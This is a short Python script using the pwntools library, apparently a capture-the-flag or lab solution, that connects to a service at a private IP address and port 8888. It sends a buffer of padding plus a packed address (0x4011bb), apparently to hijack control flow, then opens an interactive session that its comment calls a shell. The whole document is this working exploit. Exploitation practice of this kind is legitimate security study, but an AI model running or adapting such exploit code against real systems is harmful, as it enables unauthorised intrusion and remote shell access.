'''
Author: 白银
Date: 2022-11-12 18:09:27
LastEditTime: 2022-11-15 15:31:50
LastEditors: 白银
Description: 
'''
from pwn import *

context(log_level='debug', arch='arm64', os='linux')

io = remote("192.168.61.134", 8888)

payload = b'a' * 4 + p64(0x4011bb)

dem = b'input:\n'
io.sendafter(dem, payload)

io.interactive()  # 交互shell